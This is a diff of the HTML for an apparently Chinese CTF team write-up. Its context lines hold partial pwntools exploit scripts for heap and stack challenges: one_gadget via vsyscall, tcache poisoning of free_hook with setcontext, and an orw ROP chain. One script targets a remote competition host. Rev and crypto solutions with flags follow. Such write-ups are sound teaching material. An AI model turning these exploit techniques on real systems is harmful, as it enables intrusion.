-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span><span class="lnt">117
-</span><span class="lnt">118
-</span><span class="lnt">119
-</span><span class="lnt">120
-</span><span class="lnt">121
-</span><span class="lnt">122
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">Fore</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">Style</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">inspect</span>
@@ -1213,9 +765,7 @@ cc4可以直接打，但是不出网，所以得打一个tomcat通用回显
 </span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="unexploitable">unexploitable</h2>
+</span></span></code></pre></div><h2 id="unexploitable">unexploitable</h2>
 <p>利用思路：</p>
 <p>因为程序仅仅有一个read函数，没有canary，而且溢出的字节非常大，所以本题可以随便溢，但问题是没有后门函数，并且没有输出函数。在开了PIE的情况下，很多花活是没法用的。</p>
 <p>通过调试发现，在main函数返回到libc_start_main函数的时候，该地址是一个libc地址，而让执行流跳到一个地址就能get shell的地址只有one_gadget。通过用set命令更改内存的值为one_gadget，发现第一个one_gadget就能用(如下)
@@ -1225,32 +775,7 @@ cc4可以直接打，但是不出网，所以得打一个tomcat通用回显
 即使我们溢出篡改了libc_start_main,也会返回到它上面的地址，所以我们需要让执行流滑到libc_start_main上，开了PIE保护，我们无法直接获取ret指令的地址，但是vsyscall的地址始终是固定的，它可以当做ret指令来用。
 所以我们把上图的0xdeadbeef改成vsyscall的地址即可，执行到vsyscall的时候就可以往下滑到爆破成功的one_gadget，从而获取shell。
 EXP</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="c1">#context.log_level=&#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">==</span> <span class="s2">&#34;debug&#34;</span>
@@ -1271,9 +796,7 @@ EXP</p>
 </span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="sandboxheap">sandboxheap</h2>
+</span></span></code></pre></div><h2 id="sandboxheap">sandboxheap</h2>
 <p>沙箱分析
 <img src="/img/2022-xyb-SU-Writeup/7.png" alt="img">
 此处为0才不会进入if，否则就走ptrace禁用了。
@@ -1288,22 +811,7 @@ EXP</p>
 <p>重新回到漏洞上面，这道题通过调试可以发现是溢出了一个比特，其实跟off by null的思路一样，都是去溢出然后篡改堆块的prev_inuse位，然后去打一个堆块合并。但是这道题还有一个难点就是有沙箱保护，通过分析沙箱规则，我们需要打一条rop链。因此对应的策略就是用setcontext来改变寄存器的值，从而将执行流劫持到rop链上</p>
 <p>利用思路：
 由于我们需要打堆块合并，所以需要让合并的堆块释放掉能够进入unsorted bin，因此第一件事是先填满tcache bin。接着去打堆块合并,脚本如下：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11</span><span class="p">):</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mh">0x88</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>    
@@ -1314,34 +822,8 @@ EXP</p>
 </span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">debug</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">&#39;pie&#39;</span><span class="p">,</span><span class="mh">0xED6</span><span class="p">,</span><span class="mh">0xEE2</span><span class="p">,</span><span class="mh">0xEEE</span><span class="p">,</span><span class="mh">0xEFA</span><span class="p">,</span><span class="mh">0xC9F</span><span class="p">,</span><span class="mh">0xBA7</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span><span class="c1">#堆块合并</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>接下来去泄露堆地址和libc地址，大致思路就是做堆块重叠，让一块被释放掉的内存落在一个正在使用的堆块中，从而执行show函数完成泄露libc和堆地址。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+</span></span></code></pre></div><p>接下来去泄露堆地址和libc地址，大致思路就是做堆块重叠，让一块被释放掉的内存落在一个正在使用的堆块中，从而执行show函数完成泄露libc和堆地址。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="err">​</span>
 </span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="mh">0xc0</span><span class="p">)</span>
@@ -1361,107 +843,8 @@ EXP</p>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="mh">0x98</span><span class="o">*</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">heap_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="n">log_addr</span><span class="p">(</span><span class="s1">&#39;heap_addr&#39;</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>最后去打一个tcache poisoning,将free_hook申请出来，然后写入setcontext+53的地址，提前在堆块中布置好各个寄存器的值，最后去释放掉该堆块。即可控制各个寄存器，从而去执行系统调用read。将rop链读到执行流上，从而执行rop链(orw)读出flag。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span><span class="lnt">80
-</span><span class="lnt">81
-</span><span class="lnt">82
-</span><span class="lnt">83
-</span><span class="lnt">84
-</span><span class="lnt">85
-</span><span class="lnt">86
-</span><span class="lnt">87
-</span><span class="lnt">88
-</span><span class="lnt">89
-</span><span class="lnt">90
-</span><span class="lnt">91
-</span><span class="lnt">92
-</span><span class="lnt">93
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
+</span></span></code></pre></div><p>最后去打一个tcache poisoning,将free_hook申请出来，然后写入setcontext+53的地址，提前在堆块中布置好各个寄存器的值，最后去释放掉该堆块。即可控制各个寄存器，从而去执行系统调用read。将rop链读到执行流上，从而执行rop链(orw)读出flag。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
 </span></span><span class="line"><span class="cl">context(os = &#34;linux&#34;, arch = &#34;amd64&#34;, log_level = &#34;debug&#34;)
 </span></span><span class="line"><span class="cl">#io = process([&#34;./sandbox&#34;, &#34;./sandboxheap&#34;])
 </span></span><span class="line"><span class="cl">io = remote(&#34;101.201.71.136&#34;, 12795)
@@ -1554,137 +937,10 @@ EXP</p>
 </span></span><span class="line"><span class="cl">delete(12)
 </span></span><span class="line"><span class="cl">io.send(orw)
 </span></span><span class="line"><span class="cl">io.interactive()
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="bitheap">bitheap</h2>
+</span></span></code></pre></div><h2 id="bitheap">bitheap</h2>
 <p>这道题和sandboxheap一样，而且还没有这道题的沙箱保护，用上道题的exp直接打就可以拿到flag
 exp</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span><span class="lnt">117
-</span><span class="lnt">118
-</span><span class="lnt">119
-</span><span class="lnt">120
-</span><span class="lnt">121
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">#io = process([&#34;./sandbox&#34;, &#34;./sandboxheap&#34;])</span>
@@ -1805,84 +1061,9 @@ exp</p>
 </span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">orw</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="leak">leak</h2>
+</span></span></code></pre></div><h2 id="leak">leak</h2>
 <p>flag被读到了一个堆块上，限制了申请堆块的个数，只能十六个，没有限制uaf的使用次数，可以改大Global_Max_Fast，造成fastbinY数组溢出，我们可以向write_base和write_ptr上写入堆地址，满足条件:write_ptr&gt;write_base即可，利用公式size=((target_addr-(main_arena+8)/8)*0x10+0x20)，就可以算出需要的size，最后exit，打印出flag即可。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./leak&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./leak&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc-2.27.so&#34;</span><span class="p">)</span>
@@ -1951,9 +1132,7 @@ exp</p>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Your choice: &#34;</span><span class="p">,</span> <span class="s2">&#34;6&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h1 id="misc">Misc</h1>
+</span></span></code></pre></div><h1 id="misc">Misc</h1>
 <h2 id="strange_forensics">strange_forensics</h2>
 <p>flag1是用户密码，直接搜root:
 爆破出密码
@@ -1971,25 +1150,7 @@ flag{890topico_y0u_Ar3_tHe_LInUx_forEnsIcS_MASTER}</p>
 <h1 id="rev">Rev</h1>
 <h2 id="roket">roket</h2>
 <p>测试输入数据和输出数据寻找规律发现是输入转ascii码然后三次方得到输出</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gmpy2</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">iroot</span><span class="p">(</span><span class="mi">7212272804013543391008421832457418223544765489764042171135982569211377620290274828526744558976950004052088838419495093523281490171119109149692343753662521483209758621522737222024221994157092624427343057143179489608942837157528031299236230089474932932551406181</span><span class="p">,</span> <span class="mi">3</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="c1">#6374667b746831735f69735f7265346c6c795f626561757431666c795f72316768743f7d</span>
@@ -2003,42 +1164,10 @@ flag{890topico_y0u_Ar3_tHe_LInUx_forEnsIcS_MASTER}</p>
 </span></span><span class="line"><span class="cl"><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x74</span><span class="p">,</span><span class="mh">0x3f</span><span class="p">,</span><span class="mh">0x7d</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)):</span>
 </span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span><span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h1 id="crypto">crypto</h1>
+</span></span></code></pre></div><h1 id="crypto">crypto</h1>
 <h2 id="little-little-fermat">little little fermat</h2>
 <p>题名提示了费马，并且分析p和q的生成过程可知，A相比于n是不算太大的；遂直接考虑费马分解n，得到p，q以后根据assert 114514 ** x % p == 1可知x为p-1或p-1的整数倍，直接取x为p-1进行计算，异或就能得到flag。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
